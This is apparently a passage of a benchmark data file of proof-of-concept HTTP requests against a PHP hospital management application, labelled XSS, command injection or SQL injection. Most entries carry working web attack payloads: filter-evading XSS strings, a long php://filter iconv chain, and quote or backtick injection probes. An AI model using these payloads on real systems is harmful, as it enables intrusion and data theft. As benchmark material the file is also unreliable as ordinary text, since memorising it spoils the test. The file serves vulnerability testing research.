+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_57334a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/change-password.php",
+    "post_data": {
+      "cfpass": [
+        "Test@12345"
+      ],
+      "cpass": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "npass": [
+        "Test@12345"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e4030b8",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_583990",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/",
+    "post_data": {
+      "password": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "submit": [
+        ""
+      ],
+      "username": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6827459e35a48",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_58d860",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/about-us.php",
+    "post_data": {
+      "pagedes": [
+        "<ul style=\"padding: 0px; margin-right: 0px; margin-bottom: 1.313em; margin-left: 1.655em;\" times=\"\" new=\"\" roman\";=\"\" font-size:=\"\" 14px;=\"\" text-align:=\"\" center;=\"\" background-color:=\"\" rgb(255,=\"\" 246,=\"\" 246);\"=\"\"><li style=\"text-align: left;\"><font color=\"#000000\">The Hospital Management System (HMS) is designed for Any Hospital to replace their existing manual, paper based system. The new system is to control the following information; patient information, room availability, staff and operating room schedules, and patient invoices. These services are to be provided in an efficient, cost effective manner, with the goal of reducing the time and resources currently required for such tasks.</font></li><li style=\"text-align: left;\"><font color=\"#000000\">A significant part of the operation of any hospital involves the acquisition, management and timely retrieval of great volumes of information. This information typically involves; patient personal information and medical history, staff information, room and ward scheduling, staff scheduling, operating theater scheduling and various facilities waiting lists. All of this information must be managed in an efficient and cost wise fashion so that an institution's resources may be effectively utilized HMS will automate the management of the hospital making it more efficient and error free. It aims at standardizing data, consolidating data ensuring data integrity and reducing inconsistencies.&nbsp;</font></li></ul>"
+      ],
+      "pagetitle": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e41baf1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_5b56cb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/betweendates-detailsreports.php",
+    "post_data": {
+      "fromdate": [
+        "11024-02-01"
+      ],
+      "submit": [
+        ""
+      ],
+      "todate": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e3eaba0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_62c3cd",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "GET",
+    "path": "/hms/admin/manage-users.php",
+    "post_data": {},
+    "query_params": {
+      "del": [
+        "delete"
+      ],
+      "id": [
+        "\""
+      ]
+    },
+    "request_id": "requests.68286fbd5b4bd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_7028b8",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/",
+    "post_data": {
+      "description": [
+        "Witcher"
+      ],
+      "emailid": [
+        "1998-10-11"
+      ],
+      "fullname": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "mobileno": [
+        "1998-10-11"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b6979229b4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_70a71f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/add-doctor.php",
+    "post_data": {
+      "Doctorspecialization": [
+        "ENT"
+      ],
+      "cfpass": [
+        "xuefeng20011024"
+      ],
+      "clinicaddress": [
+        "Witcher"
+      ],
+      "doccontact": [
+        "1998-10-11"
+      ],
+      "docemail": [
+        "test@test.com"
+      ],
+      "docfees": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "docname": [
+        "1998-10-11"
+      ],
+      "npass": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd618a2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_71c6e2",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/forgot-password.php",
+    "post_data": {
+      "email": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "fullname": [
+        "1998-10-11"
+      ],
+      "submit": [
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682c754511cb0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_7623c3",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/",
+    "post_data": {
+      "password": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "submit": [
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        "",
+        ""
+      ],
+      "username": [
+        "1998-10-11"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b697919a70",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_798229",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/",
+    "post_data": {
+      "description": [
+        "Witcher"
+      ],
+      "emailid": [
+        "1998-10-11"
+      ],
+      "fullname": [
+        "1998-10-11"
+      ],
+      "mobileno": [
+        "`"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b6979217a2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_7edc0b",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/contact.php",
+    "post_data": {
+      "email": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "mobnum": [
+        "112334455"
+      ],
+      "pagedes": [
+        "D-204, Hole Town South West, Delhi-110096,India"
+      ],
+      "pagetitle": [
+        "1998-10-11"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682c75450c15f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_839564",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/",
+    "post_data": {
+      "description": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "emailid": [
+        "1998-10-11"
+      ],
+      "fullname": [
+        "1998-10-11"
+      ],
+      "mobileno": [
+        "1998-10-11"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b6979232dd",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_958da6",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/registration.php",
+    "post_data": {
+      "address": [
+        "127.0.0.1"
+      ],
+      "city": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "full_name": [
+        "1998-10-11"
+      ],
+      "gender": [
+        "female"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "password_again": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd7a2e7",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_95c882",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/add-doctor.php",
+    "post_data": {
+      "Doctorspecialization": [
+        "ENT"
+      ],
+      "cfpass": [
+        "xuefeng20011024"
+      ],
+      "clinicaddress": [
+        "Witcher"
+      ],
+      "doccontact": [
+        "1998-10-11"
+      ],
+      "docemail": [
+        "test@test.com"
+      ],
+      "docfees": [
+        "1998-10-11"
+      ],
+      "docname": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "npass": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd6373f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_b2b364",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/contact.php",
+    "post_data": {
+      "email": [
+        "test@test.com"
+      ],
+      "mobnum": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "pagedes": [
+        "D-204, Hole Town South West, Delhi-110096,India"
+      ],
+      "pagetitle": [
+        "1998-10-11"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682c75450eb66",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_bf7849",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/contact.php",
+    "post_data": {
+      "email": [
+        "info@gmail.com"
+      ],
+      "mobnum": [
+        "1122334455"
+      ],
+      "pagedes": [
+        "D-204, Hole Town South West, Delhi-110096,India"
+      ],
+      "pagetitle": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e431245",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_c18985",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/add-doctor.php",
+    "post_data": {
+      "Doctorspecialization": [
+        "ENT"
+      ],
+      "cfpass": [
+        "xuefeng20011024"
+      ],
+      "clinicaddress": [
+        "Witcher"
+      ],
+      "doccontact": [
+        "1998-10-11"
+      ],
+      "docemail": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "docfees": [
+        "1998-10-11"
+      ],
+      "docname": [
+        "1998-10-11"
+      ],
+      "npass": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd62d1c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_d429ba",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/doctor/index.php",
+    "post_data": {
+      "password": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "submit": [
+        ""
+      ],
+      "username": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a10afaf7bb",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_d554b7",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/index.php",
+    "post_data": {
+      "description": [
+        "Witcher"
+      ],
+      "emailid": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "fullname": [
+        "1998-10-11"
+      ],
+      "mobileno": [
+        "1998-10-11"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b697931a54",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_da4e08",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/add-doctor.php",
+    "post_data": {
+      "Doctorspecialization": [
+        "\""
+      ],
+      "cfpass": [
+        "xuefeng20011024"
+      ],
+      "clinicaddress": [
+        "Witcher"
+      ],
+      "doccontact": [
+        "1998-10-11"
+      ],
+      "docemail": [
+        "test@test.com"
+      ],
+      "docfees": [
+        "1998-10-11"
+      ],
+      "docname": [
+        "1998-10-11"
+      ],
+      "npass": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd64bce",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_e12d86",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/change-emaild.php",
+    "post_data": {
+      "email": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e4167e2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_eb1186",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/registration.php",
+    "post_data": {
+      "address": [
+        "1998-10-11"
+      ],
+      "city": [
+        "1998-10-11"
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "full_name": [
+        "x'efeng20011024"
+      ],
+      "gender": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "password_again": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
